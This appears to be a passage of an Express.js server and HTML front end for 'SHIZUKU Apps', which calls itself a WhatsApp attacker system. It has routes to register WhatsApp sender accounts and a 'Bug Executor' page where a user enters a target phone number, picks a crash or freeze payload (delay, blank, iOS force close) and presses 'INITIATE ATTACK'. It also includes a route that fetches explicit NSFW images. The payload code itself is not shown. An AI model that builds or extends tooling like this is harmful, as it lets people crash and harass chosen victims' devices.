app.get('/api/nsfw/random', requireAuth, async (req, res) => {
  try {
    const apiEndpoints = [
      'https://api.waifu.pics/nsfw/waifu',
      'https://api.waifu.pics/nsfw/neko',
      'https://api.waifu.pics/nsfw/blowjob',
      'https://nekos.life/api/v2/img/nsfw_neko_gif',
      'https://nekos.life/api/v2/img/lewd',
      'https://purrbot.site/api/img/nsfw/neko/gif'
    ];

    let imageUrl = null;
    let attempts = 0;

    for (const endpoint of apiEndpoints) {
      attempts++;
      try {
        console.log(`Mencoba API: ${endpoint}`);
        const response = await axios.get(endpoint, { timeout: 10000 });
        
        if (response.data) {
          if (response.data.url) {
            imageUrl = response.data.url;
          } else if (response.data.image) {
            imageUrl = response.data.image;
          } else if (response.data.message) {
            imageUrl = response.data.message;
          } else if (response.data.result) {
            imageUrl = response.data.result;
          }
        }

        if (imageUrl) {
          console.log(`✅ Berhasil dengan API: ${endpoint}`);
          break;
        }
      } catch (apiError) {
        console.log(`❌ API ${endpoint} gagal:`, apiError.message);
        continue;
      }
    }

    if (imageUrl) {
      return res.json({
        success: true,
        image: imageUrl
      });
    } else {
      return res.status(404).json({ 
        error: "Semua API tidak merespons. Coba lagi nanti." 
      });
    }

  } catch (error) {
    console.error('NSFW API Error:', error.message);
    res.status(500).json({ 
      error: "Gagal mengambil gambar. Server API sedang gangguan." 
    });
  }
});

app.get("/mysender", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "my-senders.html");
  res.sendFile(filePath);
});

app.get("/api/mysenders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  
  res.json({ 
    success: true, 
    senders: userSenders,
    total: userSenders.length
  });
});

app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  userEvents.set(username, res);

  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  const cleanNumber = number.replace(/\D/g, '');
  if (!cleanNumber.startsWith('62')) {
    return res.json({ success: false, error: "Nomor harus diawali dengan 62" });
  }
  
  if (cleanNumber.length < 10) {
    return res.json({ success: false, error: "Nomor terlalu pendek" });
  }
  
  try {
    console.log(`[API] User ${username} adding sender: ${cleanNumber}`);
    const sessionDir = userSessionPath(username, cleanNumber);
    
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then((sock) => {
        console.log(`[${username}] ✅ Sender ${cleanNumber} connected successfully`);
      })
      .catch((error) => {
        console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
      });

    res.json({ 
      success: true, 
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: cleanNumber,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    });
    
  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({ 
      success: false, 
      error: "Terjadi error saat memproses sender: " + error.message 
    });
  }
});

app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter(n => n !== number);
      saveUserSessions(userSessions);
    }
    
    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    
    res.json({ 
      success: true, 
      message: "Sender berhasil dihapus",
      number: number
    });
  } catch (error) {
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};


// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = "",
  userRole = "user"
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SHIZUKU Apps</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #a855f7;
            --primary-glow: #a855f7;
            --secondary: #0ea5e9;
            --dark-bg: #030014;
            --glass-bg: rgba(17, 25, 40, 0.65);
            --glass-border: rgba(255, 255, 255, 0.08);
            --text-main: #ffffff;
            --text-muted: #94a3b8;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--dark-bg);
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(168, 85, 247, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(14, 165, 233, 0.15) 0%, transparent 40%);
            font-family: 'Plus Jakarta Sans', sans-serif;
            color: var(--text-main);
            min-height: 100vh;
            overflow-x: hidden;
            padding-bottom: 90px;
        }

        /* --- BACKGROUND ANIMATION --- */
        .grid-bg {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: 
                linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
            background-size: 30px 30px;
            z-index: -1;
            pointer-events: none;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* --- HEADER --- */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 5px;
            margin-bottom: 25px;
        }

        .header-left h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 24px;
            background: linear-gradient(to right, #fff, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 800;
            letter-spacing: 1px;
        }

        .header-left p {
            color: var(--text-muted);
            font-size: 12px;
            margin-top: 2px;
        }

        .profile-btn {
            width: 40px;
            height: 40px;
            border-radius: 12px;
            background: rgba(255,255,255,0.05);
            border: 1px solid var(--glass-border);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            cursor: pointer;
            transition: 0.3s;
            text-decoration: none;
        }

        .profile-btn:hover {
            background: rgba(168, 85, 247, 0.2);
            border-color: var(--primary);
        }

        /* --- CARDS --- */
        .glass-card {
            background: var(--glass-bg);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }

        .card-header i {
            font-size: 18px;
            color: var(--primary);
            background: rgba(168, 85, 247, 0.1);
            padding: 10px;
            border-radius: 10px;
        }

        .card-title {
            font-family: 'Orbitron', sans-serif;
            font-weight: 600;
            font-size: 16px;
        }

        /* --- INPUTS --- */
        .input-group {
            position: relative;
            margin-bottom: 25px;
        }

        .input-label {
            display: block;
            margin-bottom: 10px;
            font-size: 13px;
            color: var(--text-muted);
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .input-wrapper {
            position: relative;
        }

        .input-wrapper i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
            transition: 0.3s;
        }

        .custom-input {
            width: 100%;
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            padding: 16px 16px 16px 45px;
            color: #fff;
            font-family: 'JetBrains Mono', monospace;
            font-size: 15px;
            outline: none;
            transition: all 0.3s ease;
        }

        .custom-input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(168, 85, 247, 0.15);
            background: rgba(0, 0, 0, 0.4);
        }

        .custom-input:focus + i {
            color: var(--primary);
        }

        /* --- BUG MODE GRID --- */
        .mode-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }

        /* Span 2 columns for the last item if odd number */
        .mode-option:last-child:nth-child(odd) {
            grid-column: span 2;
        }

        .mode-option {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            padding: 15px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .mode-option:hover {
            transform: translateY(-2px);
            background: rgba(255, 255, 255, 0.06);
        }

        .mode-option.active {
            background: rgba(168, 85, 247, 0.15);
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(168, 85, 247, 0.15);
        }

        .mode-icon {
            font-size: 24px;
            margin-bottom: 10px;
            color: var(--text-muted);
            transition: 0.3s;
        }

        .mode-option.active .mode-icon {
            color: var(--primary);
            transform: scale(1.1);
        }

        .mode-name {
            font-size: 13px;
            font-weight: 700;
            margin-bottom: 4px;
            color: #fff;
        }

        .mode-desc {
            font-size: 10px;
            color: var(--text-muted);
            line-height: 1.3;
        }

        /* --- BUTTON --- */
        .btn-execute {
            width: 100%;
            background: linear-gradient(135deg, var(--primary), #7c3aed);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 16px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 16px;
            letter-spacing: 1px;
            cursor: pointer;
            margin-top: 25px;
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(168, 85, 247, 0.3);
        }

        .btn-execute:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(168, 85, 247, 0.4);
        }

        .btn-execute:active {
            transform: scale(0.98);
        }

        .btn-execute:disabled {
            background: #333;
            cursor: not-allowed;
            box-shadow: none;
        }

        .btn-loading i {
            animation: spin 1s infinite linear;
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }

        /* --- STATUS BAR --- */
        .status-pill {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid var(--glass-border);
            padding: 8px 16px;
            border-radius: 30px;
            font-size: 12px;
            margin-right: 8px;
        }

        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #22c55e;
            box-shadow: 0 0 10px #22c55e;
        }

        .dot.offline { background: #ef4444; box-shadow: 0 0 10px #ef4444; }

        /* --- FLOATING NAVBAR --- */
        .navbar {
            position: fixed;
            bottom: 25px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(15, 15, 20, 0.85);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.1);
            padding: 10px 30px;
            border-radius: 50px;
            display: flex;
            gap: 30px;
            z-index: 100;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        }

        .nav-item {
            color: var(--text-muted);
            font-size: 20px;
            text-decoration: none;
            padding: 10px;
            border-radius: 50%;
            transition: all 0.3s;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .nav-item.active {
            color: #fff;
            background: linear-gradient(135deg, var(--primary), #7c3aed);
            box-shadow: 0 0 20px rgba(168, 85, 247, 0.4);
        }

        .nav-item:hover:not(.active) {
            color: #fff;
            transform: translateY(-2px);
        }

        /* --- RESULTS --- */
        #result-area {
            display: none;
            margin-top: 20px;
            border-top: 1px solid rgba(255,255,255,0.1);
            padding-top: 20px;
        }
        
        .console-log {
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            color: #22c55e;
            background: rgba(0,0,0,0.5);
            padding: 15px;
            border-radius: 12px;
            border-left: 3px solid #22c55e;
            line-height: 1.6;
        }

        .error-log {
            color: #ef4444;
            border-left-color: #ef4444;
        }

        /* --- WARNING MESSAGE --- */
        .warning-message {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .warning-message i {
            color: #ef4444;
            font-size: 18px;
        }

        .warning-text {
            font-size: 14px;
            color: #ff9999;
            line-height: 1.4;
        }

        /* --- LOADING ANIMATION --- */
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }

        .loading-spinner {
            display: inline-block;
            width: 40px;
            height: 40px;
            border: 3px solid rgba(168, 85, 247, 0.3);
            border-radius: 50%;
            border-top-color: var(--primary);
            animation: spin 1s ease-in-out infinite;
        }

        /* --- USER INFO SECTION --- */
        .user-info-section {
            background: var(--glass-bg);
            backdrop-filter: blur(16px);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .user-info-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }

        .user-info-item:last-child {
            border-bottom: none;
        }

        .user-info-label {
            color: var(--text-muted);
            font-size: 14px;
        }

        .user-info-value {
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            color: #fff;
        }

        .expired-soon {
            color: #f59e0b !important;
        }

        .expired-danger {
            color: #ef4444 !important;
        }

    </style>
</head>
<body>
    <div class="grid-bg"></div>

    <div class="container">
        <header>
            <div class="header-left">
                <h1>SHIZUKU APPS</h1>
                <p>System Penyerang WhatsApp</p>
            </div>
            <a href="/dashboard" class="profile-btn">
                <i class="fa-solid fa-arrow-left"></i>
            </a>
        </header>

        <!-- User Info Section -->
        <div class="user-info-section">
            <div class="user-info-item">
                <span class="user-info-label">Username</span>
                <span class="user-info-value">${username || 'Guest'}</span>
            </div>
            <div class="user-info-item">
                <span class="user-info-label">Role</span>
                <span class="user-info-value">${userRole.toUpperCase()}</span>
            </div>
            <div class="user-info-item">
                <span class="user-info-label">Expired</span>
                <span class="user-info-value ${Date.now() > expired ? 'expired-danger' : (expired - Date.now() < 86400000 ? 'expired-soon' : '')}">
                    ${formattedTime}
                </span>
            </div>
        </div>

        <!-- Status Bar -->
        <div style="margin-bottom: 25px; overflow-x: auto; white-space: nowrap; padding-bottom: 5px;">
            <div class="status-pill">
                <span class="dot" id="server-dot"></span>
                <span id="server-status">Server Online</span>
            </div>
            <div class="status-pill">
                <i class="fa-solid fa-clock" style="color: var(--secondary); font-size: 10px;"></i>
                <span id="clock">00:00:00</span>
            </div>
            <div class="status-pill">
                <i class="fa-solid fa-satellite-dish" style="color: var(--secondary); font-size: 10px;"></i>
                <span id="sender-count">0 Senders</span>
            </div>
        </div>

        <!-- Main Execution Card -->
        <div class="glass-card">
            <div class="card-header">
                <i class="fa-solid fa-terminal"></i>
                <span class="card-title">Bug Executor</span>
            </div>

            <div class="input-group">
                <label class="input-label">TARGET NUMBER</label>
                <div class="input-wrapper">
                    <input type="tel" id="target" class="custom-input" placeholder="628xxxxxxxxxx" autocomplete="off" value="${detail.target || ''}">
                    <i class="fa-solid fa-crosshairs"></i>
                </div>
            </div>

            <div class="input-group">
                <label class="input-label">SELECT PAYLOAD</label>
                <div class="mode-grid">
                    <div class="mode-option" onclick="selectMode(this, 'delay')">
                        <div class="mode-icon"><i class="fa-solid fa-stopwatch"></i></div>
                        <div class="mode-name">BUG DELAY</div>
                        <div class="mode-desc">Slowdown traffic packets</div>
                    </div>

                    <div class="mode-option" onclick="selectMode(this, 'blank')">
                        <div class="mode-icon"><i class="fa-solid fa-square"></i></div>
                        <div class="mode-name">BUG BLANK</div>
                        <div class="mode-desc">Universal UI freeze</div>
                    </div>

                    <div class="mode-option" onclick="selectMode(this, 'medium')">
                        <div class="mode-icon"><i class="fa-solid fa-bolt"></i></div>
                        <div class="mode-name">BUG MEDIUM</div>
                        <div class="mode-desc">Medium intensity effect</div>
                    </div>

                    <div class="mode-option" onclick="selectMode(this, 'iosblank')">
                        <div class="mode-icon"><i class="fa-brands fa-apple"></i></div>
                        <div class="mode-name">iOS BLANK</div>
                        <div class="mode-desc">White screen freeze</div>
                    </div>

                    <div class="mode-option" onclick="selectMode(this, 'fcinvsios')">
                        <div class="mode-icon"><i class="fa-solid fa-ghost"></i></div>
                        <div class="mode-name">iOS INVISIBLE</div>
                        <div class="mode-desc">Force close with invite</div>
                    </div>
                </div>
            </div>

            <!-- Warning Message -->
            <div id="no-sender-warning" class="warning-message" style="display: none;">
                <i class="fa-solid fa-triangle-exclamation"></i>
                <div class="warning-text">
                    <strong>No active senders found!</strong><br>
                    Add WhatsApp senders first in "My Sender" menu to use this feature.
                </div>
            </div>

            <!-- Loading -->
            <div class="loading" id="loading">
                <div class="loading-spinner"></div>
                <p style="margin-top: 10px; color: var(--text-muted);">Processing execution...</p>
            </div>

            <button class="btn-execute" id="execBtn" onclick="executeBug()">
                <i class="fa-solid fa-bolt"></i> INITIATE ATTACK
            </button>

            <!-- Results Area -->
            <div id="result-area">
                <div class="console-log" id="console-text">
                    ${message || 'Waiting for command...'}
                </div>
            </div>
        </div>
    </div>

    <!-- Navigation -->
    <nav class="navbar">
        <a href="/dashboard" class="nav-item">
            <i class="fa-solid fa-house"></i>
        </a>
        <a href="/execution" class="nav-item active">
            <i class="fa-solid fa-fingerprint"></i>
        </a>
        <a href="/mysender" class="nav-item">
            <i class="fa-solid fa-server"></i>
        </a>
    </nav>

    <script>
        let currentMode = '${mode}' || null;
        let userHasSender = false;
        let activeSendersCount = 0;

        document.addEventListener('DOMContentLoaded', function() {
            if (currentMode) {
                const modeElement = document.querySelector(\`[onclick*="\${currentMode}"]\`);
                if (modeElement) {
                    selectMode(modeElement, currentMode);
                }
            }

            ${message ? `showResult('${status}', \`${message.replace(/'/g, "\\'")}\`);` : ''}

            updateClock();
            setInterval(updateClock, 1000);

            checkSenderStatus();

            setInterval(checkSenderStatus, 30000);
        });

        function updateClock() {
            const now = new Date();
            document.getElementById('clock').innerText = now.toLocaleTimeString('id-ID');
        }

        function selectMode(element, mode) {
            document.querySelectorAll('.mode-option').forEach(el => el.classList.remove('active'));
            element.classList.add('active');
            currentMode = mode;
        }

        function checkSenderStatus() {
            fetch('/api/mysenders')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        activeSendersCount = data.senders.length;
                        userHasSender = activeSendersCount > 0;
                        
                        document.getElementById('sender-count').textContent = \`\${activeSendersCount} Senders\`;
                        
                        const warningElement = document.getElementById('no-sender-warning');
                        const executeBtn = document.getElementById('execBtn');
                        
                        if (userHasSender) {
                            warningElement.style.display = 'none';
                            executeBtn.disabled = false;
                            document.getElementById('server-dot').className = 'dot';
                            document.getElementById('server-status').textContent = 'Server Online';
                        } else {
                            warningElement.style.display = 'flex';
                            executeBtn.disabled = true;
                            document.getElementById('server-dot').className = 'dot offline';
                            document.getElementById('server-status').textContent = 'No Senders';
                        }
                    }
                })
                .catch(error => {
                    console.error('Error checking sender status:', error);
                });
        }

        function executeBug() {
            const target = document.getElementById('target').value;
            const btn = document.getElementById('execBtn');
            const resultArea = document.getElementById('result-area');
            const consoleText = document.getElementById('console-text');

            if (!target) {
                showResult('error', '❌ Please enter target number!');
                return;
            }
            if (!currentMode) {
                showResult('error', '❌ Please select bug type first!');
                return;
            }
            if (!userHasSender) {
                showResult('error', '❌ No active senders available!');
                return;
            }

            const cleanNumber = target.replace(/\\D/g, '');
            if (!cleanNumber.startsWith('62') || cleanNumber.length < 10) {
                showResult('error', '❌ Invalid number format! Must start with 62 and minimum 10 digits.');
                return;
            }

            btn.disabled = true;
            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> PROCESSING...';
            btn.classList.add('btn-loading');
            
            resultArea.style.display = 'block';
            consoleText.innerHTML = \`> Initializing connection to \${cleanNumber}...<br>> Loading payload: \${currentMode.toUpperCase()}<br>> Please wait...\`;

            fetch('/execution?target=' + encodeURIComponent(cleanNumber) + '&mode=' + encodeURIComponent(currentMode), {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                }
            })
            .then(response => response.text())
            .then(html => {
                btn.disabled = false;
                btn.innerHTML = '<i class="fa-solid fa-bolt"></i> INITIATE ATTACK';
                btn.classList.remove('btn-loading');

                showResult('success', 
                    \`✅ <strong>Execution Successful!</strong><br><br>
                    <strong>Target:</strong> \${cleanNumber}<br>
                    <strong>Payload:</strong> \${currentMode.toUpperCase()}<br>
                    <strong>Senders:</strong> \${activeSendersCount} active<br>
                    <strong>Status:</strong> Bug successfully sent<br>
                    <strong>ETA:</strong> Effects visible in 1-5 minutes\`
                );
            })
            .catch(error => {
                btn.disabled = false;
                btn.innerHTML = '<i class="fa-solid fa-bolt"></i> INITIATE ATTACK';
                btn.classList.remove('btn-loading');

                showResult('error', 
                    \`❌ <strong>Execution Failed!</strong><br><br>
                    <strong>Target:</strong> \${cleanNumber}<br>
                    <strong>Payload:</strong> \${currentMode.toUpperCase()}<br>
                    <strong>Error:</strong> Failed to connect to WhatsApp sender<br>
                    <strong>Suggest:</strong> Check sender connection and try again\`
                );
            });
        }

        function showResult(type, message) {
            const consoleText = document.getElementById('console-text');
            const resultArea = document.getElementById('result-area');
            
            consoleText.innerHTML = message;
            consoleText.className = type === 'error' ? 'console-log error-log' : 'console-log';
            
            resultArea.style.display = 'block';
            resultArea.scrollIntoView({ behavior: 'smooth' });
        }

        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            const mode = params.get('mode');
            const target = params.get('target');
            
            if (mode) {
                const modeElement = document.querySelector(\`[onclick*="\${mode}"]\`);
                if (modeElement) {
                    selectMode(modeElement, mode);
                }
            }
            
            if (target) {
                document.getElementById('target').value = target;
            }
        }

        getUrlParams();
    </script>
</body>
</html>`;
};